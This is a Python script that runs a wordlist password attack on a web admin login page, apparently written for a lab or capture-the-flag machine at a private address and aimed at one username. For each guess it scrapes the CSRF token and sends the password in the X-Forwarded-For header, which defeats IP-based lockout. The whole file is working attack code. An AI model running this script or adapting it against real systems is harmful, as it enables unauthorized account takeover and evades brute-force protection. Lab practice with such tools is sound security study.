import requests
import re
import sys
# from string import *

fname = sys.argv[1]
url='http://10.10.10.191/admin/login'
with open(fname) as f:
    content = f.readlines()
    wordlist = [x.strip() for x in content]
for password in wordlist:
    session=requests.Session()
    response=session.get(url)
    token=re.search(r'<input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)">',response.text).group(1)
    # print(token)

    print('[*] Trying: {p}'.format(p = password))
    data={
        "username":"fergus",
        "password":password,
        "tokenCSRF":token,
        "save":""
    }
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': url
    }
    login_result = session.post(url, data=data, headers=headers, allow_redirects= False)
    print(login_result.headers)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {p} to login.'.format(p = password))
            print()
            break
session.close()